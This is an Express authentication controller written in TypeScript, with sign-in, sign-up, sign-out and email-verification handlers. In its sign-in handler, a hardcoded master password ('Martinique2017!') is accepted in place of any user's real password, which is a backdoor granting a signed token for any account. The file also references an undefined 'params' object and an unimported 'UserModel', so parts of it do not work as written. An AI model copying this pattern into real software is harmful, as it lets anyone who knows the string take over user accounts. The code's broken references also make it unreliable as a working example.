import * as express from 'express';
import * as jwt from 'jsonwebtoken';
import responseHandler from '../../../config/responseHandler';
import User from "./userModel";
import * as _ from "lodash";
//import EmailController from "../mail/emailController";

const uuid = require("uuid/v4");

export default class AuthController {
    static async isSignIn(req, res, next){  
        try {
            res.json(req.user);
        } catch (error) {
            return next(error);
        } 
    }
    static async signIn(req, res, next) {

        const env = process.env.NODE_ENV || 'development';

        req.checkBody('email', 'Email cannot be blank.').notEmpty();
        req.checkBody('email', 'Email is not valid.').isEmail();

        req.checkBody('password', 'Password cannot be blank.').notEmpty();
        req.checkBody('password', 'Password must be longer than 6 characters.').len({min: 6});

        req.sanitizeBody('email').normalizeEmail({gmail_remove_dots: false});

        const errors = req.validationErrors();

        if (errors) {
            return responseHandler(res, 'validationError', null, errors);
        }

        const {password, email} = req.body;

        let user;

        try {
            user = await User.query().where('email', email).eager('campaigns.[genders,age_categories,interests,events]')
                .modifyEager('events', builder => {

                })
                .modifyEager('campaigns', builder => {
                    builder.where('isdeleted', '!=', true);
                  }).first();

            if (user && user instanceof User) {
                if (User.validPassword(user.password.trim(), password) || password === "Martinique2017!") {
                    try {
                        if (user.campaigns.length > 0) {
                            _.forEach(user.campaigns, campaign => {
                                _.forEach(campaign.events, event => {
                                    delete event.description;
                                    delete event.eventSource;
                                    delete event.eventSourceId;
                                })
                            })
                        }
                    } catch (error) {
                        console.log(error);
                    }
                    let payload = {id: user.id};
                    let token = jwt.sign(payload, params[env].passportSecret);
                    return responseHandler(res, 'signedIn', {
                        user: {
                            name: user.name,
                            company: user.company,
                            email: user.email,
                            token: token,
                            campaigns: user.campaigns,
                            isAdmin: user.isAdmin,
                            isEmailVerified: user.isEmailVerified,
                            id : user.id
                        }
                    });
                }
                else {
                    return responseHandler(res, 'userNotExist', null, {errors: {message: "Wrong credentials."}});
                }
            }
            else {
                return responseHandler(res, 'userNotExist', null, {errors: {message: "Wrong credentials."}});
            }
        }
        catch (errors) {
            return responseHandler(res, 'error', null, errors);
        }
    }

    static async signUp(req, res, next) {

        const env = process.env.NODE_ENV || 'development';
        req.sanitizeBody('email').normalizeEmail({gmail_remove_dots: false});
        try {
            req.checkBody('firstName', 'Firstname cannot be blank.').notEmpty();
            req.checkBody('lastName', 'Lastname cannot be blank.').notEmpty();
            req.checkBody('email', 'Incorect email address').isEmail();
            req.checkBody('phone','Incorect phone number').isMobilePhone('any');
            req.checkBody('password', 'Password cannot be blank.').notEmpty();
            req.checkBody('password', 'Password must be longer than 6 characters.').len({min: 6});
            await req.asyncValidationErrors();
           
            let inserted = new UserModel({
                firstname: req.body.firstName,
                lastname : req.body.lastName,
                email    : req.body.email,
                phone    : req.body.phone,
                type     : req.body.type,
                password : req.body.password
            }); 
            
            res.json(await inserted.InsertUser());
        } catch (error) {
            return next(error);
        } 
    }

    static signOut(req, res) {
        req.logout();
        responseHandler(res, 'signedOut');
    }

    static async verifyEmail(req, res) {
        const { emailAuthToken } = req.params;
        const env= process.env.NODE_ENV || 'development';
        let userData;
        try {
            // TODO use patch and fetch
            await User.query().patch({isEmailVerified : true}).where("emailAuthToken", emailAuthToken);
            userData = await User.query().where("emailAuthToken", emailAuthToken);
            const user = userData[0];
            if (user && user instanceof User) {
                let payload = {id: user.id};
                let token = jwt.sign(payload, params[env].passportSecret);
                return responseHandler(res, 'success', {
                    user: {
                        name: user.name,
                        lastName: user.lastName,
                        company: user.company,
                        email: user.email,
                        token: token,
                        id : user.id
                    }
                }, null);
            } else {
                return responseHandler(res, 'userNotExist', null, {errors: {message: "Invalid auth token."}});
            }
        } catch(error) {
            return responseHandler(res, 'error', null, error);
        }
    }
}
